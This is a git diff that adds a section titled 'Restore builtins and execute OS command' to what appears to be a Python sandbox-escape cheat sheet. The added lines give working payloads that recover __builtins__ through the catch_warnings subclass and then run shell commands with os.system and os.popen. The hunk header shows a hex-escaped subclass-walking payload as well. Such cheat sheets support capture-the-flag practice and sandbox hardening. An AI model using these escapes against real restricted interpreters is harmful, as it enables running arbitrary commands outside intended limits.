@@ -126,7 +126,29 @@ i={}\x2e\x5f\x5fclass\x5f\x5f\x2e\x5f\x5fbase\x5f\x5f\x2e\x5f\x5fsubclasses\x5f\
 
 ```
 
+## Restore builtins and execute OS command
 
+```text
+
+# Restore builtin
+__builtins__=([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__)
+__builtins__["__import__"]('os').system('ls')
+
+
+
+### To execute + read output
+
+# Print all available function in __builtins__
+print(__builtins__)
+
+# len()
+size = __builtins__['len']('String len is 16')
+
+# import os; os.popen('ls').read()
+lfiles = __builtins__['__import__']('os').popen('ls').read()
+
+
+```
 
 
 
